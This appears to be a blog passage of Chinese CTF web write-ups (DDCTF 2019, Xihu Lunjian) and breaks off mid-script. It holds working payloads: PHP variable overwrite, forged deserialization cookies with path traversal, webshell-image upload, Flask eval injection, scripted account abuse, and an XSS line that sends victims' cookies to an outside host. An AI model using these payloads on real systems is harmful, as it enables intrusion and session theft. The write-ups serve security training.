将参数jpg的值进行两次base64解码得到666C61672E6A7067，再进行十六进制转字符串的处理后得到flag.jpg，然后在源代码看到了加载出了flag.jpg文件的源码，怀疑是通过文件读取函数file_get_contents进行读取图片，将index.php进行转十六进制并进行两次base64编码后的值TmprMlpUWTBOalUzT0RKbE56QTJPRGN3赋值给参数jpg，得到经过base64加密后的源码： 解密后得到index.php源代码： 1234567891011121314151617181920212223242526&lt;?php/* * https://blog.csdn.net/FengBanLiuYun/article/details/80616607 * Date: July 4,2018 */error_reporting(E_ALL || ~E_NOTICE);header('content-type:text/html;charset=utf-8');if(! isset($_GET['jpg'])) header('Refresh:0;url=./index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09');$file = hex2bin(base64_decode(base64_decode($_GET['jpg'])));echo '&lt;title&gt;'.$_GET['jpg'].'&lt;/title&gt;';$file = preg_replace(\"/[^a-zA-Z0-9.]+/\",\"\", $file);echo $file.'&lt;/br&gt;';$file = str_replace(\"config\",\"!\", $file);echo $file.'&lt;/br&gt;';$txt = base64_encode(file_get_contents($file));echo \"&lt;img src='data:image/gif;base64,\".$txt.\"'&gt;&lt;/img&gt;\";/* * Can you find the flag file? * */?&gt; 对读取文件做了过滤处理，首先是通过正则匹配函数过滤除了a-z,A-Z,0-9和小数点.以外的所有字符，并且将关键词config替换为!，看似flag就在config.php中，但是怎么想也绕不了过滤，这时注意到了代码开头的注释部分提示了一个博客地址，仔细翻阅博主的另一篇文章，里面提示一个文件名practice.txt.swp，访问，出现了文件名f1ag!ddctf.php 那么再次用同样的方法读取flag!ddctf.php文件的源代码，其中的感叹号!在参数中用config代替便可，即参数$file == hex2bin(base64_encode(base64_encode(&#39;f1agconfigddctf.php&#39;))) 获得f1ag!ddctf.php源代码： 123456789101112131415161718&lt;?phpinclude('config.php');$k = 'hello';extract($_GET);if(isset($uid))&#123; $content=trim(file_get_contents($k)); if($uid==$content) &#123; echo $flag; &#125; else &#123; echo'hello'; &#125;&#125;?&gt; 考察变量覆盖和PHP伪协议，payload： 12345678910111213POST /f1ag!ddctf.php?k=php://input&amp;uid=hello HTTP/1.1Host: 117.51.150.246Cache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 5hello 得到flag：DDCTF{436f6e67726174756c6174696f6e73} WEB签到题题目链接：http://117.51.158.44/index.php 页面有401认证，查看源代码发现页面主题调用了方法auth()，注意到文件js/index.js，对其访问获得源码 js代码的大致意思是向http://117.51.158.44/app/Auth.php发送ajax请求，并设置了头部字段didictf_username，尝试头部字段didictf_username:admin时，页面响应内容为：{&quot;errMsg&quot;:&quot;success&quot;,&quot;data&quot;:&quot;\\u60a8\\u5f53\\u524d\\u5f53\\u524d\\u6743\\u9650\\u4e3a\\u7ba1\\u7406\\u5458----\\u8bf7\\u8bbf\\u95ee:app\\/fL2XID2i0Cdh.php&quot;}，发现了提示文件app/fL2XID2i0Cdh.php，访问后 可以获得/app/Application.php和/app/Session.php两个文件的源代码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546#/app/Application.phpClass Application &#123; var $path = ''; public function response($data, $errMsg = 'success') &#123; $ret = ['errMsg' =&gt; $errMsg, 'data' =&gt; $data]; $ret = json_encode($ret); header('Content-type: application/json'); echo $ret; &#125; public function auth() &#123; $DIDICTF_ADMIN = 'admin'; if(!empty($_SERVER['HTTP_DIDICTF_USERNAME']) &amp;&amp; $_SERVER['HTTP_DIDICTF_USERNAME'] == $DIDICTF_ADMIN) &#123; $this-&gt;response('您当前当前权限为管理员----请访问:app/fL2XID2i0Cdh.php'); return TRUE; &#125;else&#123; $this-&gt;response('抱歉，您没有登陆权限，请获取权限后访问-----','error'); exit(); &#125; &#125; private function sanitizepath($path) &#123; $path = trim($path); $path=str_replace('../','',$path); $path=str_replace('..\\\\','',$path); return $path;&#125;public function __destruct() &#123; if(empty($this-&gt;path)) &#123; exit(); &#125;else&#123; $path = $this-&gt;sanitizepath($this-&gt;path); if(strlen($path) !== 18) &#123; exit(); &#125; $this-&gt;response($data=file_get_contents($path),'Congratulations'); &#125; exit();&#125;&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114#/app/Session.php&lt;?phpinclude 'Application.php';class Session extends Application &#123; //key建议为8位字符串 var $eancrykey = ''; var $cookie_expiration = 7200; var $cookie_name = 'ddctf_id'; var $cookie_path = ''; var $cookie_domain = ''; var $cookie_secure = FALSE; var $activity = \"DiDiCTF\"; public function index() &#123; if(parent::auth()) &#123; $this-&gt;get_key(); if($this-&gt;session_read()) &#123; $data = 'DiDI Welcome you %s'; $data = sprintf($data,$_SERVER['HTTP_USER_AGENT']); parent::response($data,'sucess'); &#125;else&#123; $this-&gt;session_create(); $data = 'DiDI Welcome you'; parent::response($data,'sucess'); &#125; &#125; &#125; private function get_key() &#123; //eancrykey and flag under the folder $this-&gt;eancrykey = file_get_contents('../config/key.txt'); &#125; public function session_read() &#123; if(empty($_COOKIE)) &#123; return FALSE; &#125; $session = $_COOKIE[$this-&gt;cookie_name]; if(!isset($session)) &#123; parent::response(\"session not found\",'error'); return FALSE; &#125; $hash = substr($session,strlen($session)-32); $session = substr($session,0,strlen($session)-32); if($hash !== md5($this-&gt;eancrykey.$session)) &#123; parent::response(\"the cookie data not match\",'error'); return FALSE; &#125; $session = unserialize($session); if(!is_array($session) OR !isset($session['session_id']) OR !isset($session['ip_address']) OR !isset($session['user_agent']))&#123; return FALSE; &#125; if(!empty($_POST[\"nickname\"])) &#123; $arr = array($_POST[\"nickname\"],$this-&gt;eancrykey); $data = \"Welcome my friend %s\"; foreach ($arr as $k =&gt; $v) &#123; $data = sprintf($data,$v); &#125; parent::response($data,\"Welcome\"); &#125; if($session['ip_address'] != $_SERVER['REMOTE_ADDR']) &#123; parent::response('the ip addree not match'.'error'); return FALSE; &#125; if($session['user_agent'] != $_SERVER['HTTP_USER_AGENT']) &#123; parent::response('the user agent not match','error'); return FALSE; &#125; return TRUE; &#125; private function session_create() &#123; $sessionid = ''; while(strlen($sessionid) &lt; 32) &#123; $sessionid .= mt_rand(0,mt_getrandmax()); &#125; $userdata = array( 'session_id' =&gt; md5(uniqid($sessionid,TRUE)), 'ip_address' =&gt; $_SERVER['REMOTE_ADDR'], 'user_agent' =&gt; $_SERVER['HTTP_USER_AGENT'], 'user_data' =&gt; '', ); $cookiedata = serialize($userdata); $cookiedata = $cookiedata.md5($this-&gt;eancrykey.$cookiedata); $expire = $this-&gt;cookie_expiration + time(); setcookie( $this-&gt;cookie_name, $cookiedata, $expire, $this-&gt;cookie_path, $this-&gt;cookie_domain, $this-&gt;cookie_secure ); &#125;&#125;$ddctf = new Session();$ddctf-&gt;index(); 审计后的总体思路如下： 主体为Session.php，调用了Session类中的index方法，其中Session类继承了Application类 首先，调用Application类中的auth方法，必须返回true才能执行下面的语句，auth方法返回true的条件为：!empty($_SERVER[&#39;HTTP_DIDICTF_USERNAME&#39;]) &amp;&amp; $_SERVER[&#39;HTTP_DIDICTF_USERNAME&#39;] == $DIDICTF_ADMIN，即头部字段didictf_username:admin，这是个大前提 接下来调用get_key方法，可以发现该方法给出了注释部分的提示： 1234private function get_key() &#123; //eancrykey and flag under the folder $this-&gt;eancrykey = file_get_contents('../config/key.txt'); &#125; 提示flag和eancrykey都在../config文件夹下，并从key.txt取出加密的key 下一步就是调用session_read方法，如果返回true则返回的json信息中包含DiDI Welcome you $_SERVER[&#39;HTTP_USER_AGENT&#39;]，如果返回false则包含信息DiDI Welcome you，并且调用session_create方法，我们继续审计session_read方法，在其中我们可以发现其中的if语句： 12345678if(!empty($_POST[\"nickname\"])) &#123; $arr = array($_POST[\"nickname\"],$this-&gt;eancrykey); $data = \"Welcome my friend %s\"; foreach ($arr as $k =&gt; $v) &#123; $data = sprintf($data,$v); &#125; parent::response($data,\"Welcome\"); &#125; 可以看出，如果执行该if语句里的内容，可以得到加密的参数eancrykey，我们必须要让其执行，那么这个语句前面所有的条件都必须符合：（1）cookie值不能为空 （2）cookie字段中必须包含参数ddctf_id （3）$hash === md5($this-&gt;eancrykey.$session)) 前面两个条件都很好满足，关键在于最后一个条件，参数hash和session分别来自下列语句： 12$hash = substr($session,strlen($session)-32);$session = substr($session,0,strlen($session)-32); 我们知道，substr函数中的参数$session是来自于cookie字段中的参数ddctf_id的值，所以 12$hash = 变量session截取strlen($session)-32位 ~ 最后一位$session = 变量session截取 开始位 ~ strlen($session)-32位 因为我们是不知道eancrykey的值，所以无法构造一个参数session能符合第三个条件，但是我们可以注意到当session_read方法返回false时，会执行方法session_create，继续跟进该方法，会发现方法的最后执行了setcookie，内容参数$cookiedata为： 12345678$userdata = array( 'session_id' =&gt; md5(uniqid($sessionid,TRUE)), 'ip_address' =&gt; $_SERVER['REMOTE_ADDR'], 'user_agent' =&gt; $_SERVER['HTTP_USER_AGENT'], 'user_data' =&gt; '', );$cookiedata = serialize($userdata);$cookiedata = $cookiedata.md5($this-&gt;eancrykey.$cookiedata); 最终cookiedata的值即为userdata序列化后的值拼接上md5加密后的eancrykey拼接上序列化值 如上图所示，符合大前提didictf_username，但是未设置cookie值，就会执行session_create设置cookie值，而字段ddctf_id的值： 1ddctf_id=a%3A4%3A%7Bs%3A10%3A%22session_id%22%3Bs%3A32%3A%22495e31ab571f67c3c4ec41915d106c08%22%3Bs%3A10%3A%22ip_address%22%3Bs%3A14%3A%22202.101.138.82%22%3Bs%3A10%3A%22user_agent%22%3Bs%3A109%3A%22Mozilla%2F5.0+%28Windows+NT+10.0%3B+WOW64%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F73.0.3683.86+Safari%2F537.36%22%3Bs%3A9%3A%22user_data%22%3Bs%3A0%3A%22%22%3B%7D476e0efa4918bdfe3b0bbfdf499e75ac 经过url解码后为： 1a:4:&#123;s:10:&quot;session_id&quot;;s:32:&quot;495e31ab571f67c3c4ec41915d106c08&quot;;s:10:&quot;ip_address&quot;;s:14:&quot;202.101.138.82&quot;;s:10:&quot;user_agent&quot;;s:109:&quot;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36&quot;;s:9:&quot;user_data&quot;;s:0:&quot;&quot;;&#125;476e0efa4918bdfe3b0bbfdf499e75ac 可以看到32位的字符串476e0efa4918bdfe3b0bbfdf499e75ac这个即为加密的盐（参数eancrykey）与序列化值a:4:{s:10:&quot;session_id&quot;;s:32:&quot;495e31ab571f67c3c4ec41915d106c08&quot;;s:10:&quot;ip_address&quot;;s:14:&quot;202.101.138.82&quot;;s:10:&quot;user_agent&quot;;s:109:&quot;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36&quot;;s:9:&quot;user_data&quot;;s:0:&quot;&quot;;}拼接后的md5加密值，首先想到的是拿去md5解密网站上进行解密得到key，但是解密失败 虽然无法解密直接得到key，但是在session_read方法中，我们同样可以得到key，条件则是如前面所提到的，符合$hash === md5($this-&gt;eancrykey.$session)) 可以发现，session_create方法得到的ddctf_id字段值正好符合这个条件： 从响应结果来看，说明session_read方法返回true，说明符合了前面的所有条件，那么最后要得到key，需要的条件为POST一个参数nickname，该参数与key加入一个数组$arr，通过遍历该数组对字符串Welcome my friend %s进行字符替换，由于参数nickname为数组第一个元素，所以第一个替换的为nickname的值，替换一次后，要想再替换上key，则nickname的值中必须包含%s，所以，最终得到key的payload如下： 123456789101112131415POST /app/Session.php HTTP/1.1Host: 117.51.158.44Cache-Control: max-age=0Upgrade-Insecure-Requests: 1didictf_username:adminUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3Cookie:ddctf_id=a%3A4%3A%7Bs%3A10%3A%22session_id%22%3Bs%3A32%3A%22495e31ab571f67c3c4ec41915d106c08%22%3Bs%3A10%3A%22ip_address%22%3Bs%3A14%3A%22202.101.138.82%22%3Bs%3A10%3A%22user_agent%22%3Bs%3A109%3A%22Mozilla%2F5.0+%28Windows+NT+10.0%3B+WOW64%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F73.0.3683.86+Safari%2F537.36%22%3Bs%3A9%3A%22user_data%22%3Bs%3A0%3A%22%22%3B%7D476e0efa4918bdfe3b0bbfdf499e75acAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 11nickname=%s 得到的key为：EzblrbNS 但这只是key，要想得到flag，我们必须利用前面读取出key的函数file_get_contents读取../config/flag.txt才能最终获取flag，这就需要利用到session_read方法中的反序列化语句$session = unserialize($session); 那么接下来就需要寻找可以利用反序列化进行修改的参数，在类Application的方法__destruct中，发现语句：$this-&gt;response($data=file_get_contents($path),&#39;Congratulations&#39;);，存在可以利用的参数$path，追溯该参数来源，发现path经过函数sanitizepath过滤： 123456private function sanitizepath($path) &#123; $path = trim($path); $path=str_replace('../','',$path); $path=str_replace('..\\\\','',$path); return $path;&#125; 并且需要满足条件：strlen($path) === 18，才可以执行上述语句进行文件读取 所以，思路很清晰了，通过参数session进行反序列化改变参数path的值读取文件../config/flag.txt 要进行反序列化，同样要满足我们一开始提到的得到key的三个条件，但是这里我们已经知道了key，所以很容易就可以控制参数session 获得序列化值的代码如下： 12345678class Appliacation&#123; var $path = ''; ...&#125;$session = new Application();$session-&gt;path = \"..././config/flag.txt\"echo serialize($session); 获得到的序列化值为： 1O:11:&quot;Application&quot;:1:&#123;s:4:&quot;path&quot;;s:21:&quot;..././config/flag.txt&quot;;&#125; 接下来将key与序列化值进行拼接后进行md5加密 1echo md5(&apos;EzblrbNS&apos;.$session); 加密后的值为5a014dbe49334e6dbb7326046950bee 那么session值就为： 1O:11:&quot;Application&quot;:1:&#123;s:4:&quot;path&quot;;s:21:&quot;..././config/flag.txt&quot;;&#125;5a014dbe49334e6dbb7326046950bee 最终获取flag的payload： 1234567891011GET /app/Session.php HTTP/1.1Host: 117.51.158.44Cache-Control: max-age=0Upgrade-Insecure-Requests: 1didictf_username:adminUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3Cookie:ddctf_id=O:11:&quot;Application&quot;:1:&#123;s:4:&quot;path&quot;%3bs:21:&quot;..././config/flag.txt&quot;%3b&#125;5a014dbe49334e6dbb7326046950bee2Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: close flag：DDCTF{ddctf2019_G4uqwj6E_pHVlHIDDGdV8qA2j} Upload-IMG题目链接：http://117.51.148.166/upload.php 很清晰的一道文件上传题，尝试上传php一句话，抓包修改Content-type字段为image/jpeg，修改文件名后缀名为jpg都无法上传，提示请上传JPG/GIF/PNG格式的图片文件，猜测后台是对上传的文件内容进行了检查，上传图片马中包含phpinfo，却提示[Check Error]上传的图片源代码中未包含指定字符串:phpinfo()，将上传后的图片下载下来，与原来图片比较发现phpinfo不见了，说明对上传的图片进行了二次渲染，类似于upload-labs中的一道绕过二次渲染题目 绕过二次渲染上传图片马参考地址：https://xz.aliyun.com/t/2657 使用其中生成jpg图片的php脚本，过程为向服务器任意上传一个jpg文件，将上传成功的jpg文件下载下来，命名为1.jpg，再运行脚本，命令为:php jpg_payload.php 1.jpg 在目录下生成加入图片马的jpg图片，我们可以在16进制编辑器打开验证： 成功插入phpinfo信息，再次在服务器中上传该图片马 成功获得flag 另外png的图片同样可以通过参考链接中的其他脚本生成图片马，gif文件则需要比较前后图片的相同之处即imagecreatefromgif函数未修改的部分，比较麻烦一点 flag：DDCTF{B3s7_7ry_php1nf0_f2a042657ff79fad} 大吉大利,今晚吃鸡~题目链接：http://117.51.147.155:5050/index.html#/login 这题有点类似护网杯的买辣条，抓包发现Cookie带有REVEL_SESSION，说明是go语言，继续抓取购买吃鸡入场券的包时，发现有参数ticket_price=2000，可是我们的余额只有100，明显无法购买入场券，后台的代码逻辑可能为用户存款 - （吃鸡入场券数×入场券价格 ） &gt;= 0 ，尝试修改ticket_price=100，无法生成订单，通过二分法尝试，只有大于等于1000时才能生成订单,这就想起了go语言的最大整数溢出漏洞。 123456789有符号整数类型int8 有符号的8位整数，范围 -128 到127int16 有符号的16位整数，范围 -32768 到 32767int32 有符号的32位整数，范围 -2147483648 到 2147483647int64 有符号的64位整数，范围 -9223372036854775808 到 9223372036854775807uint8 无符号8位整数，范围 0 到 255uint16 无符号16位整数，范围 0 到 65535uint32 无符号32位整数，范围 0 到 4294967295uint64 无符号64位整数，范围 0 到 18446744073709551615 正如上面所列出的go语言各类整数的范围，我们一个个尝试，尝试ticket_price=4294967296，即uint32 无符号32位整数值加1时，能成功购买入场券，并且余额并没有减少，还是100，这就说明了4294967296发生了溢出，变为了0，满足上面的逻辑判断 购买成功后，获得本账号的id和ticket，并且提示需要移除100位对手才能最终吃鸡，很明显需要我们写脚本进行注册并移除，注册100位账户的脚本register.py代码如下： 123456789import requestspassword = \"12345678\"for i in range(1000,1101): name = \"test\" name = name + str(i) url = \"http://117.51.147.155:5050/ctf/api/register?name=%s&amp;password=%s\"%(name,password) r = requests.get(url) print(r.text) 注册100位后，我们需要再通过脚本分别对这100位用户进行登录，获取吃鸡入场券订单，购买订单，最后提取出各自分别的id和ticket，以上这些步骤都分别需要观察每个步骤的响应包json字段内容来判断是否提交成功以及提取id和ticket的信息，chiji.py代码如下： 1234567891011121314151617181920212223242526272829303132333435363738import requestsimport res = requests.Session()list_your_id = []list_your_ticket = []password = \"12345678\"for i in range(1000,1200): name = \"test\" + str(i) url1 = \"http://117.51.147.155:5050/ctf/api/login?name=%s&amp;password=%s\"%(name,password) r1 = s.get(url1) if '\"code\":200' in r1.text: #login successfully ticket_price = 4294967296 url2 = \"http://117.51.147.155:5050/ctf/api/buy_ticket?ticket_price=%d\"%(ticket_price) r2 = s.get(url2) if '\"ticket_price\":' in r2.text: #get bill successfully bill_id = re.findall(r'\"bill_id\":\"(.*)\",',r2.text)[0] url3 = \"http://117.51.147.155:5050/ctf/api/pay_ticket?bill_id=%s\"%(bill_id) r3 = s.get(url3) if 'your_id' and 'your_ticket' in r3.text: #get ticket successfully your_id = re.findall(r'\"your_id\":(.*),\"your',r3.text)[0] your_ticket = re.findall(r'\"your_ticket\":\"(.*)\"&#125;]',r3.text)[0] list_your_id.append(your_id) print(list_your_id) list_your_ticket.append(your_ticket) print(list_your_ticket) if len(list_your_id) and len(list_your_ticket) == 100: break#chijiurl4 = \"http://117.51.147.155:5050/ctf/api/login?name=test01&amp;password=12345678\"r4 = s.get(url4)print(r4.text)for i in range(100): url5 = \"http://117.51.147.155:5050/ctf/api/remove_robot?id=%s&amp;ticket=%s\"%(list_your_id[i],list_your_ticket[i]) r5 = s.get(url5) print(r5.text) 经过测试，需要多次分批注册100个账号，即多次运行该脚本提交，才最终挤掉100位对手，猜测可能是存在提交信息过快导致服务器会来不及处理而导致提交失败的问题 最终吃鸡页面 flag：DDCTF{chiken_dinner_hyMCX[n47Fx)} homebrew event loop题目链接：http://116.85.48.107:5002/d5af31f66147e857 题目给了服务器端源码，是一个python写的Flask框架，分析代码，通过GET方式接收我们输入的参数，格式为action:ACTION;ARGS0#ARGS1#ARGS2......，要得到flag就是要执行最后的函数get_flag_handler，当满足session中的num_items字段大于等于5的条件时，会返回函数FLAG ，即得到flag 1234def get_flag_handler(args): if session['num_items'] &gt;= 5: trigger_event('func:show_flag;' + FLAG()) # show_flag_function has been disabled, no worries trigger_event('action:view;index') 但是如果按代码正常的逻辑来看，num_items的默认字段值为0，需要用session中的另一个字段points的值来换取，然而points初始化值为3 这是session中字段的初始化的代码段： 12345678910def entry_point(): querystring = urllib.unquote(request.query_string) request.event_queue = [] if querystring == '' or (not querystring.startswith('action:')) or len(querystring) &gt; 100: querystring = 'action:index;False#False' if 'num_items' not in session: session['num_items'] = 0 session['points'] = 3 session['log'] = [] ... 这是num_items和points字段值交换的代码段： 12345678910def buy_handler(args): num_items = int(args[0]) if num_items &lt;= 0: return 'invalid number(&#123;&#125;) of diamonds to buy&lt;br /&gt;'.format(args[0]) session['num_items'] += num_items trigger_event(['func:consume_point;&#123;&#125;'.format(num_items), 'action:view;index']) def consume_point_function(args): point_to_consume = int(args[0]) if session['points'] &lt; point_to_consume: raise RollBackException() session['points'] -= point_to_consume 一开始认为的思路是修改session值来改变num_items，points字段的值来执行该函数。在flask中，session是经过参数app.secret_key来进行加密的，所以我们还必须得到加密的key，才能伪造session以获取flag，而获取该key则必须通过参数对代码进行注入，得到app.secret_key 找出的可能存在的注入点在buy_handler函数，通过python3的格式化字符format存在的漏洞注入得到配置信息，但是服务器端对用户的输入存在白名单过滤： 12def execute_event_loop(): valid_event_chars = set('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789:;#') 故该方法无效，其实这题只是考察单纯绕过代码逻辑来调用get_flag_handler函数，我们可以注意，服务器执行的函数取决点在于列表request.event_queue，只要列表request.event_queue中还有事件，就会通过eval函数执行 123try: event_handler = eval(action + ('_handler' if is_action else '_function')) ret_val = event_handler(args) 而列表request.event_queue是通过函数trigger_event进行改变的，所以我们可以通过调用trigger_event函数来进行多函数调用 按照正常的逻辑而言，如果我们正常调用buy_handler函数，并且传入的参数为5，payload为：?action:buy;5执行到最后会执行语句trigger_event([&#39;func:consume_point;{}&#39;.format(num_items), &#39;action:view;index&#39;])，这时候事情列表request.event_queue中就会添加两个事件consume_point_function和view_handler，也就是说，接下来调用的函数必然是consume_point_function，执行到该函数中的判断语句if session[&#39;points&#39;] &lt; point_to_consume: raise RollBackException()时，由于session[&#39;points&#39;]小于5，则出现了报错信息 但是如果我们控制事件列表request.event_queue中的事件顺序为：buy_handler,get_flag_handler,comsume_point_function，那么由于buy_handler函数中的语句session[&#39;num_items&#39;] += num_items，此时session[&#39;num_items&#39;]被设置为了5，执行下一个函数get_flag_handler时，就能成功执行语句：if session[&#39;num_items&#39;] &gt;= 5:trigger_event(&#39;func:show_flag;&#39; + FLAG()) 所以最终的payload为： 1?action:trigger_event%23;action:buy;5%23action:get_flag; 首先调用的函数是trigger_event，注意到这里的%23即#，在python的eval函数中，注释符同样能注释掉后面的语句，也就是说注释掉了后面的字符串_handler或_fuction，测试如下： 123456&gt;&gt;&gt; def hello(): print(\"hello\") &gt;&gt;&gt; a = eval('hello#aaa')&gt;&gt;&gt; a()hello 传入trigger_event的参数为列表[action:buy;5,action:get_flag;]，函数执行完毕后，此时事件列表request.event_queue的内容为：[action:buy;5,action:get_flag;] 下一个调用函数为：buy_handler，传入的参数为5，此时事件列表request.event_queue的内容为：[action:get_flag;]，当函数buy_handler执行到语句trigger_event([&#39;func:consume_point;{}&#39;.format(num_items), &#39;action:view;index&#39;])时，事件列表中又添了新的事件，此时内容为：[action:get_flag;,func:consume_point;5,action:view;index] 那么下一个调用的函数便为get_flag，因为此时刚执行完函数buy_handler，session[&#39;num_items&#39;] == 5，所以执行语句trigger_event(&#39;func:show_flag;&#39; + FLAG())，此时事件列表中又添加了新的内容：fuction:show_flag;拼接上FLAG()函数执行结果 我们可以执行到trigger_event函数中的语句：session[&#39;log&#39;].append(event)，即session[&#39;log&#39;]字段中存储着每次新添加进来的事件，所以必然有FLAG()函数执行结果 所以最后我们需要解密session字段，通过下列脚本代码解密： 123456789101112131415161718192021222324252627282930313233#!/usr/bin/env python3import sysimport zlibfrom base64 import b64decodefrom flask.sessions import session_json_serializerfrom itsdangerous import base64_decodedef decryption(payload): payload, sig = payload.rsplit(b'.', 1) payload, timestamp = payload.rsplit(b'.', 1) decompress = False if payload.startswith(b'.'): payload = payload[1:] decompress = True try: payload = base64_decode(payload) except Exception as e: raise Exception('Could not base64 decode the payload because of ' 'an exception') if decompress: try: payload = zlib.decompress(payload) except Exception as e: raise Exception('Could not zlib decompress the payload before ' 'decoding the payload') return session_json_serializer.loads(payload)if __name__ == '__main__': print(decryption(sys.argv[1].encode())) 解密结果中获得flag，从log字段内容也验证之前的过程分析 最终的flag为：DDCTF{3v4l_3v3nt_100p_aNd_fLASK_cOOkle}","categories":[{"name":"ctf","slug":"ctf","permalink":"https://Foxgrin.github.io/categories/ctf/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://Foxgrin.github.io/tags/ctf/"}]},{"title":"杭州\"西湖论剑\"ctf-Web","slug":"杭州“西湖论剑”ctf-Web","date":"2019-04-11T07:15:00.000Z","updated":"2019-04-11T15:19:27.619Z","comments":true,"path":"/posts/42277/","link":"","permalink":"https://Foxgrin.github.io/posts/42277/","excerpt":"这场比赛打了个酱油，只解了3题。意识到自己还需更加努力学习，趁着平台再次开放，复现一下Web的三道题","text":"这场比赛打了个酱油，只解了3题。意识到自己还需更加努力学习，趁着平台再次开放，复现一下Web的三道题 babyt3题目链接：http://61.164.47.198:10000/ 页面直接给出了提示include $_GET[&#39;file&#39;]，是一个文件包含题目 利用PHP伪协议读取index.php经过base64加密后的源代码： 1/index.php?file=php://filter/convert.base64-encode/resource=index.php 1234567891011121314#index.php&lt;?php$a = @$_GET['file'];if (!$a) &#123; $a = './templates/index.html';&#125;echo 'include $_GET[\\'file\\']';if (strpos('flag',$a)!==false) &#123; die('nonono');&#125;include $a;?&gt;&lt;!--hint: ZGlyLnBocA== --&gt; 源代码又给出了提示hint:ZGlyLnBocA==，base64解密后得到dir.php 继续用伪协议读dir.php的源代码： 1/index.php?file=php://filter/convert.base64-encode/resource=dir.php 123456&lt;?php$a = @$_GET['dir'];if(!$a)&#123;$a = '/tmp';&#125;var_dump(scandir($a)); 发现读取目录下文件的函数scandir，读取根目录发现flag文件dir.php?dir=/ 再次利用伪协议读取flag文件，payload如下： 1/index.php?file=php://filter/convert.base64-encode/resource=/ffffflag_1s_Her4 解密后获得flag：flag{8dc25fd21c52958f777ce92409e2802a} 猜猜flag是什么题目链接：http://61.164.47.198:10002 一开始通过GET方式提交参数name，发现页面会返回我们输入的参数name的值，尝试了一下XSS，?name=%253cscript%253e%253c/script%253e，弹出了hint:e10adc3949ba59abbe56e057f20f883e md5解密是123456，但是一直没懂这个提示的意思，用御剑扫后台也没有扫到什么有用的 比赛结束后，参考别人的WP发现这题就是路径泄露 首先，通过dirsearch工具扫描目录，该工具下载链接：https://github.com/maurosoria/dirsearch 扫描到/.DS_Store 再通过ds_store_exp工具进行还原，该工具下载链接：https://github.com/lijiejie/ds_store_exp 还原结果发现存在目录/e10adc3949ba59abbe56e057f20f883e，即前面发现的提示 访问/e10adc3949ba59abbe56e057f20f883e/.git，发现存在git文件泄露，使用githack工具还原 还原后发现压缩包BackupForMySite.zip，但是被加密，发现里面存在lengzhu.jpg，得知这是一个明文攻击 先将lengzhu.jpg通过2345好压压缩为lengzhu.zip，再与BackupForMySite.zip通过ARCHPR工具进行明文攻击， 进行解密一段时间后，虽然没有得到解压密码，但是得到解压后的压缩包 解压后得到hint内容： 12code is 9faedd5999937171912159d28b219d86well ok ur good...By the way, flag saved in flag/seed.txt 看到code想到了首页的code兑换码，于是访问/?code=9faedd5999937171912159d28b219d86 得到一个数字：4795334，看样子不像是flag hint中还有内容flag saved in flag/seed.txt，但是访问/flag/seed.txt也没有得到flag 但是看到seed就想到了这是一个随机数，需要工具php_mt_seed进行破解，该工具下载链接：https://www.openwall.com/php_mt_seed/，下载解压后进入目录执行`make`得到`php_mt_seed` 解密后的结果逐一尝试 访问/flag/309551.txt得到flag：flag{0730b6193000e9334b12cf7c95fbc736} breakout题目链接：http://61.164.47.198:10001 题目一开始为登录页面，但是完全不需要输入任何用户名和密码即可登录，登录后，有三个页面：/main.php为留言页面；/report.php为提交URL页面，提交完成后管理员会访问；/exec.php为命令执行页面，但是只有管理员才可以执行命令 题目思路挺明确的，利用留言页面进行XSS注入，再提交留言页面的URL，窃取到管理员的cookie，最后执行命令获取flag 首先在留言页面进行XSS注入，通过测试后台将script替换成:)，所以考虑用img标签的onerror事件，将空格+onerror=替换成了:)，绕过方法是将onerror和=之间换行，注入内容为： 12&lt;img src=x onerror=alert(/xss/)&gt; 成功执行弹框，那么接下来只要控制onerror事件内容即可将管理员cookie发送到自己的服务器，payload为： 12&lt;img src=x onerror=&quot;var img = new Image();img.src=&apos;http://fw5can.ceye.io/?c=&apos;+document.cookie;&quot;&gt; 当管理员访问/main.php时，触发onerror事件后就会将自己的cookie值提交到我们的服务器上，我们即可在服务器的日志信息上发现 接下来，需要在/report.php中提交/main.php页面的URL值，但是这里必须同时要提交正确的验证码，验证码的条件为：substr(md5($str), 0, 6) === xxxxxx，即我们提交的验证码经过md5加密后的前六位为指定的随机6位数字，因为每次访问页面，产生的6位数字都不同，所以需要通过脚本进行提交，代码如下： 1234567891011121314151617181920212223242526272829import requestsimport reimport hashlibdef md5(s): return hashlib.md5(s.encode(encoding='UTF-8')).hexdigest()s = requests.Session()url = \"http://61.164.47.198:10001/report.php\"headers = &#123; 